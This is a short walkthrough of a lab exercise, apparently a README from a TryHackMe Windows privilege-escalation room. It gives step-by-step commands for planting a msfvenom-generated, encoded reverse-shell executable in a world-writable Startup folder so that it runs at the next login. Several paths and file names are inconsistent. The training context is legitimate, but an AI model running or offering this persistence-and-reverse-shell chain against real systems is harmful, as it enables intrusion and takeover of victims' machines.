# service-escalation-startup

*credit to THM* | https://tryhackme.com/room/windowsprivescarena

1) Run icacls.exe on C:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`C:\Users\user> icacls "C:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"`

[![Image of icacls](https://github.com/kam1n0/service-escalation-startup/blob/master/icacls.png)](#)

* Note that the *BUILTIN\Users* group has (F) *Full Access* permissions to the *Startup* directory.

2) Start *pyftpdlib* on Kali:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`$ python3 -m pyftpdlib -p 21 --write`

* Note: if pyftpdlib is not installed do the following:

[![Image of install](https://github.com/kam1n0/service-escalation-registry/blob/master/tmp_upload/install.png)](#)

3) Generate shellcode and save as *startup.exe*:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=9001 -e x86/shikata_ga_nai -f exe -o startup.exe`

4) Transfer *startup.exe* to windows victim machine:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`C:\Users\user\Desktop> get startup.exe`

5) Place *startup.exe* in *C:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup*:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`C:\Users\user\Desktop> cp filepermservice.exe C:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`

6) Start new session to get *Startup* programs to run and should have *reverse shell*
